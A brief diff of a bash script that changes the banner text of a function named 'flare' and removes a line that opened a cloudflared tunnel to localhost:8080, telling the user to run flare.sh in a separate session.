@@ -5,10 +5,10 @@ IP=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 flare(){
 echo -e "\e[96m        |=====================================================|"
 echo -e "\e[96m        |                      CLOUDFLARED SERVER             |"
-echo -e "\e[96m        |                      FIND LINK YOURSELF             |"
-echo -e "\e[96m        |     EXAMPLE https://example-url.trycloudflare.com   |"
+echo -e "\e[96m        |         copy this command =>(  bash flare.sh   )    |"
+echo -e "\e[96m        |     OPEN NEW SESSION AND RUN ABOVE COMMAND          |"
 echo -e "\e[96m        |=====================================================|"
-cloudflared --url localhost:8080
+
 }
 local(){
 bash local.sh 
